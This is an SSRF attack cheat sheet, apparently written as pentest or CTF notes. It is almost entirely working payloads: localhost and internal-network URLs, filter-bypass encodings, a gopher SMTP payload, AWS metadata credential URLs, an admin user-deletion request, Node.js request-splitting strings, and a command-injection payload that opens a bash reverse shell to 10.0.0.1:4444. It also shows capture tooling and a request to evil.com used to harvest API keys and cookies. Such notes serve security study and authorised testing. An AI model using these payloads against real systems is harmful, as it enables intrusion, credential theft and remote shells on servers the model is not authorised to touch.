title: SSRF (Server-Side Request Forgery)
description: SSRF is a type of exploit where an attacker abuses the functionality of a server causing it to access or manipulate information in the realm of that server that would otherwise not be directly accessibleto the attacker. SSRF is an attack against a server.

## SSRF Capture Tools

If we want to capture incoming requests from target website/server, there is a lot of open-source tools available.

### Ngrok

[https://ngrok.com/](https://ngrok.com/)

To start `ngrok` server, run the following.

```sh
ngrok http 80

# Force http scheme (not https)
ngrok http --scheme=http 8090 --host-header=localhost:8090
```

Then start your local web server for fetching requests forwarded from the `ngrok` server.

```sh
sudo python3 -m http.server 80
# or
python3 -m http.server 8090
```

After starting `ngrok` and local web server, we can use the URL such as `https://abcd-12-3-45-678.ngrok-free.app`.

### Localhost.run

[http://localhost.run/](http://localhost.run/)

As mentioned the official documentation, 

```sh
# If you don't already have an SSH key, generate it first.
ssh-keygen -t rsa

# Port forwarding to your local 8080 port.
ssh -R 80:localhost:8080 localhost.run
```

After running the command above, copy generated URL such as `abcdef123456789.lhr.life`.  
Requests sent to this URL will be forwarded to your `localhost:8080`.

### LocalXpose

[LocalXpose](https://localxpose.io/) is a reverse proxy that enables you to expose your [localhost](http://localhost) to the internet. To use it, we need to sign up and Access Token.


1. Login using Access Token.

```sh
loclx account login
```

2. Open browser to access GUI version.

```sh
loclx
```

### Pastebin

[https://pastebin.com/](https://pastebin.com/)

After writing the content in there, we can easily use the `raw` page such as [https://pastebin.com/raw/abcdefgh](https://pastebin.com/raw/abcdefgh).

### Interactsh

[Interactsh](https://github.com/projectdiscovery/interactsh)

```sh
interactsh-client -v
```

### Other Tools

- [Webhook.site](https://webhook.site/)
- [pingb.in](http://pingb.in/)
    

### Local Web Server

Also we can simply open local web server if local machine accepts external requests.

```bash
python3 -m http.server 8000
```

<br />

## HTTP (http://)

We may be able to use another server in the target machine.  
For example, pass the localhost URL to the GET parameters.  
Also These are available in POST params.

```sh
# Localhost
?url=http://localhost/
?url=http://127.0.0.1/
?url=http://127.0.0.1:80/
?url=http://127.0.0.1:3000/
?url=http://127.0.0.1:8000/
?url=http://127.0.0.1:8080/
?url=http://0/
?url=http://2130706433/
?url=http://017700000001/
?url=http://127.1/
?url=http://127.0.0.1/test.php%00
?url=http://127.0.0.1/test.php\x00

# Backend URL (e.g. 192.168.0.x)
?url=http://192.168.0.23/
?url=http://192.168.0.23:80/
?url=http://192.168.0.23:3000/
?url=http://192.168.0.23:8000/
?url=http://192.168.0.23:8080/

# Server status
?url=http://localhost/server-status

# At sign
?url=test@sub.example.com/index.php
```

### Local Port Enumeration

We can find which port is opening by fuzzing port number.

```bash
seq 1 65535 | ffuf -u https://example.com/?url=http://127.0.0.1:FUZZ -w -
```

<br />

## Gopher (gopher://)

We may be able to use `gopher://` scheme.

### Automation

We can use [Gopherus](https://github.com/tarunkant/Gopherus) to create a payload automatically.

### SMTP

At first, we need to prepare a payload for sending message to victim user.

```bash
gopher://127.0.0.1:25/_MAIL FROM:<john@example.com>
RCPT TO:<mike@example.com>
DATA
From:john@gofer.htb
Subject:Test
Hi, I'm not hacker.
.
```

The payload above can be URL encoded with tools such as **CyberChef**.  Then the encoded payload is as follow.

```bash
gopher://127.0.0.1:25/_MAIL%20FROM:%3Cjohn@example.com%3E%0ARCPT%20TO:%3Cmike@example.com%3E%0ADATA%0AFrom:john@gofer.htb%0ASubject:Test%0AHi,%20I'm%20not%20hacker.%0A.
```

We can use it to SSRF.

```bash
?url=gopher://127.0.0.1:25/_MAIL...
```

<br />

## Listen HTTP Request

If the website is vulnerable to SSRF, we can fetch sensitive information in HTTP request by sniffing.  
First off, start a listener in local machine.

```bash
sudo nc -lvp 80
```

Then send request that is affected by SSRF.

```bash
https://example.com/mail?server=http://evil.com
```

See the HTTP request in local machine.  
We might be able to fetch the sensitive data such as API key, Cookie, etc.

<br />

## OS Command Injection

```bash
?url=http://127.0.0.1:3000/test;whoami
?url=http://127.0.0.1:3000/test;ping+-c+1+10.0.0.1
# Reverse Shell
?url=http://127.0.0.1:3000/;bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
```

<br />

## Admin Operations

We may be able to operate significant stuff as the admin user via local server.

```sh
# Localhost
?url=http://localhost/admin
?url=http://localhost/admin/delete?username=john
?url=http://127.1/%25%36%31dmin

# Backend URL (e.g. 192.168.0.x)
?url=http://192.168.0.23/admin
?url=http://192.168.0.23/admin/delete?username=john
```

<br />

## Whitelisted URL Bypass

If the target website allows only the whitelisted URL, we can use them.  
Assume only "example.com" is allowed by the target website.

```sh
?url=http://localhost@example.com/
?url=http://localhost%25%32%33@example.com/
```

<br />

## Open Redirect

```sh
key=/post/next?path=http://localhost/admin
```

<br />

## AWS Instances

```bash
?url=http://169.254.169.254/latest/dynamic/instance-identity/
?url=http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
```

<br />

## Hostname Bypass

### 1. Add Target Domain to /etc/hosts in Local Machine

```sh
x.x.x.x sub.example.com
```

Restart the hostname service to apply the configuration imediately.

```sh
sudo systemctl restart systemd-hostnamed
```

### 2. Access to the Domain We Specified**

```txt
https://example.com/?proxy=https://sub.example.com
```

<br />

## API Request

We might be able to get information from an API endpoint that is not accessible normally.

```bash
?url=https://api.example.com/users
?url=https://api.example.com@internal-api.example.com/users
```

<br />

## Reveal Filtered Websites via Monitoring Tools (Webhook)

Some web apps may have monitoring tools that check the health of external websites.  
You may be able to reveal hidden contents of the target via the monitor.  
First off, create a redirect server using Python. Here it’s named “redirect.py”.

```py
#!/usr/bin/python3
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

class Redirect(BaseHTTPRequestHandler):
  def do_GET(self):
      self.send_response(302)
      self.send_header('Location', sys.argv[1])
      self.end_headers()

HTTPServer(("0.0.0.0", 8000), Redirect).serve_forever()
```

After creating, run the following command.  
Assume that the filtered port is 3000 (nmap will reveal it).

```sh
python3 redirect.py http://127.0.0.1:3000
```

And start listener for receiving the POST request of the webhook from the target website.

```sh
nc -lvnp 4444
```

Now set the configuration of the webhook. For example:

```txt
Payload URL: http://<local-ip>:4444/
Monitored URL: http://<local-ip>:8000/
```

You can see the contents of the filtered app.

<br />

## Request Splitting

Reference: [https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/](https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/)

It is the vulnerability of the Node.js `http.get` module, which allows attacker to insert HTTP headers and bodies by splitting request.  
First off, prepare HTTP headers and body as below:

```html
HTTP/1.1

POST /update HTTP1.1
Content-Length: 28

username=admin&password=newpass

GET
```

Then manipulate it for sending to target.

```bash
# \u0120: space
# \u010D: \r
# \u010A: \n
?url=http://example.com\u0120HTTP/1.1\u010D\u010APOST\u0120/update\u0120HTTP/1.1\u010D\u010AContent-Length:\u012028\u010D\u010A\u010D\u010Ausername=admin&password=pass\u010D\u010A\u010D\u010AGET\u0120
```
